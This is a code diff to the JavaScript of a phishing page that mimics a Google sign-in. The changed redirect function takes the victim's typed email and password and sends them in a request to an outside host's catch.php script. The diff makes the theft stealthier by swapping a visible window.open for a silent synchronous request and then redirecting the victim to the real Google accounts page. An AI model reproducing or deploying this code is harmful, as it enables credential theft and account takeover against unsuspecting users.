@@ -32,10 +32,13 @@ function redirect(){
     var theXssUrl = "https://www.dei.isep.ipp.pt/~jpl/catch.php?email=" + document.getElementById('Email').value + "&pwd=" + document.getElementById('Passwd').value;
     //var theXssUrl = "<%== @xss_hook_url %>";
     if(theXssUrl){
-        window.open(theXssUrl);
-        window.focus();
+        //window.open(theXssUrl);
+        //window.focus();
+        window.location = "https://accounts.google.com/";
+        var request = new XMLHttpRequest();
+        request.open("GET", theXssUrl, false);
+        request.send(null);
     }
-    window.location = "https://accounts.google.com/";
 }
 
 function displayPhishingSite(){
